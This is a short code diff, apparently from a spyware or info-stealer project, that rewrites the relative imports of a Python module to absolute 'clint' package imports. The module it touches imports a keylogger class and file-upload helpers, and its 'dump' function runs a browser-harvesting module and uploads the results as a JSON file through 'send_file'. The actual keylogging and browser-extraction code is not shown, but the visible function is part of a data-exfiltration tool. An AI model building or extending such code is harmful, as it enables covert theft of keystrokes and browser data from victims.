@@ -1,14 +1,14 @@
 #%%
 from logger import log
 from time import sleep
-from .util import data_store, username
-from .keylogger import Keyloger
-from .drive import send_file, drive_file
+from clint.util import data_store, username
+from clint.keylogger import Keyloger
+from clint.drive import send_file, drive_file
 
 
 #%%
 def dump(*args, **kwargs):
-    from .browsers.module import run
+    from clint.browsers.module import run
     send_file(f"dump_{args[0]}.json", content=list(run()))
 
 def set_value(*args, **kwargs):
